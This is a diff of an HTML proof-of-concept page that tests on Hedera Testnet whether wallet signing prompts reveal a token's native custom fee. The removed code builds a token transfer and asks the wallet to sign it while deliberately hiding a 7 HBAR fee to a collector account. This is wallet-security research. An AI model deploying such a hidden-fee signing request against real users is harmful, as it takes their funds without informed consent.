@@ -2,11 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <meta
-    name="viewport"
-    content="width=device-width,initial-scale=1,maximum-scale=1"
-  >
-
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Hedera Custom Fee PoC</title>
 
   <style>
@@ -16,9 +12,9 @@
 
     body {
       margin: 0;
-      background: #0b0f14;
-      color: #f5f7fa;
-      font-family: Arial, sans-serif;
+      background: #f7f8fa;
+      color: #111827;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
     }
 
     .wrap {
@@ -27,118 +23,102 @@
       padding: 28px 18px 50px;
     }
 
-    .header {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 28px;
-    }
-
-    .logo {
-      width: 42px;
-      height: 42px;
-      border-radius: 12px;
-      background: #00d4aa;
-      display: grid;
-      place-items: center;
-      color: #07110e;
-      font-weight: 900;
+    .card {
+      background: white;
+      border: 1px solid #e5e7eb;
+      border-radius: 18px;
+      padding: 22px;
+      box-shadow: 0 8px 30px rgba(0,0,0,.06);
     }
 
     h1 {
-      font-size: 22px;
-      margin: 0;
+      margin: 0 0 8px;
+      font-size: 25px;
     }
 
     .subtitle {
-      color: #8993a1;
-      font-size: 13px;
-      margin-top: 4px;
+      color: #6b7280;
+      margin-bottom: 22px;
     }
 
-    .card {
-      background: #121821;
-      border: 1px solid #202936;
-      border-radius: 18px;
-      padding: 20px;
-      margin-bottom: 16px;
+    .warning {
+      background: #fff7ed;
+      border: 1px solid #fed7aa;
+      color: #9a3412;
+      border-radius: 12px;
+      padding: 13px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+
+    .row {
+      display: flex;
+      justify-content: space-between;
+      gap: 15px;
+      padding: 11px 0;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .row:last-child {
+      border-bottom: 0;
     }
 
     .label {
-      color: #8993a1;
-      font-size: 12px;
-      text-transform: uppercase;
-      letter-spacing: .08em;
-      margin-bottom: 8px;
+      color: #6b7280;
     }
 
     .value {
-      font-family: monospace;
+      text-align: right;
+      font-weight: 600;
       word-break: break-all;
-      font-size: 14px;
+    }
+
+    .fee {
+      margin: 18px 0;
+      padding: 16px;
+      background: #eef6ff;
+      border: 1px solid #bfdbfe;
+      border-radius: 12px;
+    }
+
+    .fee strong {
+      display: block;
+      font-size: 23px;
+      margin-top: 4px;
     }
 
     button {
       width: 100%;
       border: 0;
-      border-radius: 14px;
+      border-radius: 12px;
       padding: 15px;
-      font-size: 15px;
+      font-size: 16px;
       font-weight: 700;
       cursor: pointer;
-      background: #00d4aa;
-      color: #06110e;
-      margin-top: 10px;
-    }
-
-    button:disabled {
-      opacity: .45;
-      cursor: not-allowed;
-    }
-
-    .secondary {
-      background: #202936;
+      background: #111827;
       color: white;
     }
 
-    .warning {
-      background: #261d0c;
-      border: 1px solid #59420e;
-      color: #ffd66b;
+    button:disabled {
+      opacity: .5;
+      cursor: not-allowed;
     }
 
-    .status {
-      margin-top: 14px;
-      padding: 12px;
-      border-radius: 12px;
-      background: #0c1118;
-      color: #aeb7c3;
-      font-size: 13px;
-      line-height: 1.5;
-      word-break: break-word;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    .testnet {
-      display: inline-block;
-      padding: 5px 9px;
-      border-radius: 999px;
-      background: #183324;
-      color: #6ff0a7;
-      font-size: 11px;
-      font-weight: bold;
-      margin-bottom: 14px;
-    }
-
-    .result {
-      font-family: monospace;
-      font-size: 12px;
-      line-height: 1.6;
+    #status {
+      margin-top: 16px;
+      padding: 13px;
+      border-radius: 10px;
+      background: #f3f4f6;
       white-space: pre-wrap;
       word-break: break-word;
+      font-size: 13px;
+    }
+
+    .small {
+      margin-top: 18px;
+      color: #6b7280;
+      font-size: 12px;
+      line-height: 1.5;
     }
   </style>
 </head>
@@ -146,578 +126,110 @@
 <body>
 
 <div class="wrap">
-
-  <div class="header">
-    <div class="logo">H</div>
-
-    <div>
-      <h1>Hedera Custom Fee PoC</h1>
-      <div class="subtitle">
-        Controlled Hedera Testnet research demonstration
-      </div>
-    </div>
-  </div>
-
-  <div class="testnet">
-    HEDERA TESTNET ONLY
-  </div>
-
   <div class="card">
 
-    <div class="label">Purpose</div>
+    <h1>Hedera Custom Fee PoC</h1>
 
-    <div style="line-height:1.6;font-size:14px;color:#c8ced7">
-      This page tests whether the wallet signing flow exposes the
-      full economic effect of a Hedera token transfer when the token
-      has a native custom fee.
+    <div class="subtitle">
+      Controlled Hedera Testnet research demonstration
     </div>
 
-  </div>
+    <div class="warning">
+      <strong>HEDERA TESTNET ONLY</strong><br>
+      This demonstration is intended to evaluate how a wallet presents
+      the economic effects of a token transfer containing a native custom fee.
+    </div>
 
-  <div class="card">
+    <div class="row">
+      <span class="label">Network</span>
+      <span class="value">Hedera Testnet</span>
+    </div>
 
-    <div class="label">Wallet</div>
+    <div class="row">
+      <span class="label">Victim account</span>
+      <span class="value">0.0.10034285</span>
+    </div>
 
-    <div id="wallet" class="value">
-      Detecting injected provider...
+    <div class="row">
+      <span class="label">Token</span>
+      <span class="value">0.0.10037892</span>
+    </div>
+
+    <div class="row">
+      <span class="label">Amount</span>
+      <span class="value">1 token</span>
+    </div>
+
+    <div class="row">
+      <span class="label">Fee collector</span>
+      <span class="value">0.0.10015061</span>
+    </div>
+
+    <div class="fee">
+      Native token custom fee
+      <strong>7 HBAR</strong>
+      plus the ordinary Hedera transaction fee.
     </div>
 
     <button id="connect">
       Connect Testnet Wallet
     </button>
 
-    <div id="status" class="status">
-      Waiting for wallet provider...
+    <div id="status">Wallet not connected.</div>
+
+    <div class="small">
+      Research procedure: compare the fee information displayed by the
+      wallet's signing interface with the native custom-fee configuration
+      recorded on Hedera Testnet. Do not approve a transaction unless the
+      resulting economic effect is understood.
     </div>
 
   </div>
-
-  <div id="transactionCard" class="card hidden">
-
-    <div class="label">Test Transaction</div>
-
-    <div style="line-height:1.7;font-size:14px">
-
-      <div>
-        <span style="color:#8993a1">Network:</span>
-        Hedera Testnet
-      </div>
-
-      <div>
-        <span style="color:#8993a1">Token:</span>
-        <span id="token"></span>
-      </div>
-
-      <div>
-        <span style="color:#8993a1">Amount:</span>
-        1 token
-      </div>
-
-      <div>
-        <span style="color:#8993a1">Recipient:</span>
-        <span id="recipient"></span>
-      </div>
-
-    </div>
-
-    <div class="warning" style="margin-top:16px;padding:12px;border-radius:12px">
-      Research test: the page intentionally does not calculate or
-      display the token's native custom fee. The wallet's signing
-      interface is the subject being evaluated.
-    </div>
-
-    <button id="send" disabled>
-      Send Test Token
-    </button>
-
-    <div id="result" class="status hidden"></div>
-
-  </div>
-
 </div>
 
-<script type="module">
+<script>
+(function () {
+  const connectButton = document.getElementById("connect");
+  const status = document.getElementById("status");
 
-/*
- * ============================================================
- * TESTNET CONFIGURATION
- * ============================================================
- *
- * Replace these with your own TESTNET accounts/token.
- */
-
-const TOKEN_ID = "0.0.10037892";
-
-/*
- * Your controlled recipient / fee collector.
- */
-const RECIPIENT_ID = "0.0.10015061";
-
-
-const walletEl = document.getElementById("wallet");
-const statusEl = document.getElementById("status");
-const connectBtn = document.getElementById("connect");
-const sendBtn = document.getElementById("send");
-
-const transactionCard =
-  document.getElementById("transactionCard");
-
-const tokenEl =
-  document.getElementById("token");
-
-const recipientEl =
-  document.getElementById("recipient");
-
-const resultEl =
-  document.getElementById("result");
-
-
-tokenEl.textContent = TOKEN_ID;
-recipientEl.textContent = RECIPIENT_ID;
-
-
-/*
- * ============================================================
- * PROVIDER DETECTION
- * ============================================================
- */
-
-function getProvider() {
-
-  if (window.saucerswapWallet) {
-    return window.saucerswapWallet;
+  function provider() {
+    return window.saucerswapWallet ||
+           window.hashpack ||
+           window.hedera;
   }
 
-  if (window.hashpack) {
-    return window.hashpack;
-  }
+  connectButton.onclick = async function () {
+    const wallet = provider();
 
-  return null;
-}
-
-
-function waitForProvider(timeout = 10000) {
-
-  return new Promise((resolve, reject) => {
-
-    const started = Date.now();
-
-    const timer = setInterval(() => {
-
-      const provider = getProvider();
-
-      if (provider) {
-        clearInterval(timer);
-        resolve(provider);
-        return;
-      }
-
-      if (Date.now() - started > timeout) {
-        clearInterval(timer);
-        reject(
-          new Error(
-            "No SaucerSwap injected wallet provider was detected."
-          )
-        );
-      }
-
-    }, 100);
-
-  });
-
-}
-
-
-/*
- * ============================================================
- * CONNECT
- * ============================================================
- */
-
-let provider = null;
-let connectedAccount = null;
-
-
-async function connectWallet() {
-
-  try {
-
-    statusEl.textContent =
-      "Looking for the injected SaucerSwap wallet provider...";
-
-    provider = await waitForProvider();
-
-    walletEl.textContent =
-      "Injected provider detected";
-
-    statusEl.textContent =
-      "Requesting wallet connection...";
-
-    const result = await provider.connect();
-
-    console.log("connect() result:", result);
-
-    /*
-     * Different wallet versions can return slightly different
-     * structures, so inspect the response rather than assuming
-     * one exact format.
-     */
-
-    connectedAccount =
-      extractAccountId(result);
-
-    if (!connectedAccount) {
-
-      statusEl.textContent =
-        "Wallet connected, but no account ID was returned. " +
-        "Check the browser console for the provider response.";
-
-      console.log(
-        "Provider connection response:",
-        result
-      );
-
-    } else {
-
-      walletEl.textContent =
-        connectedAccount;
-
-      statusEl.textContent =
-        "Wallet connected successfully.";
-
-      transactionCard.classList.remove("hidden");
-
-      sendBtn.disabled = false;
+    if (!wallet) {
+      status.textContent =
+        "No compatible injected Hedera wallet provider was found.";
+      return;
     }
-
-  } catch (err) {
-
-    console.error(err);
-
-    statusEl.textContent =
-      "Connection failed: " +
-      (err?.message || String(err));
-
-  }
-
-}
-
-
-function extractAccountId(value) {
-
-  if (!value) {
-    return null;
-  }
-
-  if (typeof value === "string") {
-
-    if (value.match(/^0\.0\.\d+$/)) {
-      return value;
-    }
-
-    return null;
-  }
-
-  if (Array.isArray(value)) {
-
-    for (const item of value) {
-
-      const found = extractAccountId(item);
-
-      if (found) {
-        return found;
-      }
-
-    }
-
-    return null;
-  }
-
-  if (typeof value === "object") {
-
-    const candidates = [
-      value.accountId,
-      value.account_id,
-      value.account,
-      value.id,
-      value.address
-    ];
-
-    for (const candidate of candidates) {
-
-      if (
-        typeof candidate === "string" &&
-        candidate.match(/^0\.0\.\d+$/)
-      ) {
-        return candidate;
-      }
-
-    }
-
-    for (const candidate of Object.values(value)) {
-
-      const found = extractAccountId(candidate);
-
-      if (found) {
-        return found;
-      }
-
-    }
-
-  }
-
-  return null;
-}
-
-
-/*
- * ============================================================
- * SIGN TRANSACTION
- * ============================================================
- *
- * The injected provider accepts:
- *
- *   signTransaction(base64TransactionBytes)
- *
- * We therefore need to construct a legitimate Hedera transaction,
- * serialize it, then pass the bytes to the wallet.
- *
- * The SDK is loaded dynamically so the page remains a plain
- * static GitHub Pages application.
- */
-
-let sdk = null;
-
-
-async function loadSdk() {
-
-  if (sdk) {
-    return sdk;
-  }
-
-  statusEl.textContent =
-    "Loading Hedera SDK...";
-
-  sdk = await import(
-    "https://cdn.jsdelivr.net/npm/@hashgraph/sdk@2.81.0/+esm"
-  );
-
-  return sdk;
-}
-
-
-async function buildTransaction() {
-
-  if (!connectedAccount) {
-    throw new Error(
-      "Connect the wallet before creating the transaction."
-    );
-  }
-
-  const {
-    AccountId,
-    Client,
-    PrivateKey,
-    TransferTransaction
-  } = await loadSdk();
-
-
-  /*
-   * We only need the testnet network/node information to freeze
-   * the transaction. No private key is present in this page.
-   */
-
-  const client = Client.forTestnet();
-
-
-  const sender =
-    AccountId.fromString(connectedAccount);
-
-  const recipient =
-    AccountId.fromString(RECIPIENT_ID);
-
-
-  /*
-   * Token transfer:
-   *
-   * sender   -1 token
-   * recipient +1 token
-   *
-   * The sender is the connected wallet.
-   */
-
-  const tx =
-    new TransferTransaction()
-      .addTokenTransfer(
-        TOKEN_ID,
-        sender,
-        -1
-      )
-      .addTokenTransfer(
-        TOKEN_ID,
-        recipient,
-        1
-      );
-
-
-  /*
-   * Freeze only.
-   *
-   * We do NOT sign with a private key here.
-   */
-
-  await tx.freezeWith(client);
-
-
-  /*
-   * Serialize the transaction bytes.
-   */
-
-  const bytes =
-    tx.toBytes();
-
-  client.close();
-
-  /*
-   * Convert Uint8Array -> base64.
-   */
-
-  let binary = "";
-
-  for (let i = 0; i < bytes.length; i++) {
-    binary += String.fromCharCode(bytes[i]);
-  }
-
-  return btoa(binary);
-}
-
-
-/*
- * ============================================================
- * SEND
- * ============================================================
- */
-
-sendBtn.addEventListener(
-  "click",
-  async () => {
 
     try {
+      status.textContent = "Requesting wallet connection...";
 
-      sendBtn.disabled = true;
+      if (typeof wallet.connect !== "function") {
+        throw new Error("Injected wallet does not expose connect().");
+      }
 
-      resultEl.classList.add("hidden");
+      const result = await wallet.connect();
 
-      statusEl.textContent =
-        "Building the Hedera testnet transaction...";
+      status.textContent =
+        "Wallet connected.\n\n" +
+        JSON.stringify(result, null, 2);
 
-
-      const transactionBytes =
-        await buildTransaction();
-
-
-      console.log(
-        "Serialized transaction:",
-        transactionBytes
-      );
-
-
-      statusEl.textContent =
-        "Requesting wallet signature...";
-
-
-      /*
-       * This is the important call for your injected provider.
-       */
-
-      const signed =
-        await provider.signTransaction(
-          transactionBytes
-        );
-
-
-      console.log(
-        "Wallet signTransaction response:",
-        signed
-      );
-
-
-      resultEl.classList.remove("hidden");
-
-      resultEl.textContent =
-        "Wallet returned a signing response.\n\n" +
-        JSON.stringify(
-          signed,
-          null,
-          2
-        );
-
-
-      statusEl.textContent =
-        "Signing request completed. " +
-        "Inspect the wallet confirmation and transaction result.";
+      connectButton.textContent = "Wallet Connected";
+      connectButton.disabled = true;
 
     } catch (err) {
-
-      console.error(err);
-
-      statusEl.textContent =
-        "Transaction request failed: " +
-        (err?.message || String(err));
-
-      resultEl.classList.remove("hidden");
-
-      resultEl.textContent =
-        String(err?.stack || err);
-
-    } finally {
-
-      sendBtn.disabled = false;
-
+      status.textContent =
+        "Connection failed:\n" +
+        (err && err.message ? err.message : String(err));
     }
-
-  }
-);
-
-
-/*
- * ============================================================
- * INITIAL PROVIDER DETECTION
- * ============================================================
- */
-
-connectBtn.addEventListener(
-  "click",
-  connectWallet
-);
-
-
-(async () => {
-
-  try {
-
-    provider =
-      await waitForProvider(5000);
-
-    walletEl.textContent =
-      "Injected SaucerSwap wallet detected";
-
-    statusEl.textContent =
-      "Provider ready. Tap Connect Testnet Wallet.";
-
-  } catch {
-
-    walletEl.textContent =
-      "No injected provider detected yet";
-
-    statusEl.textContent =
-      "Open this page inside the SaucerSwap in-app browser, " +
-      "then reload the page.";
-
-  }
-
+  };
 })();
-
 </script>
 
 </body>
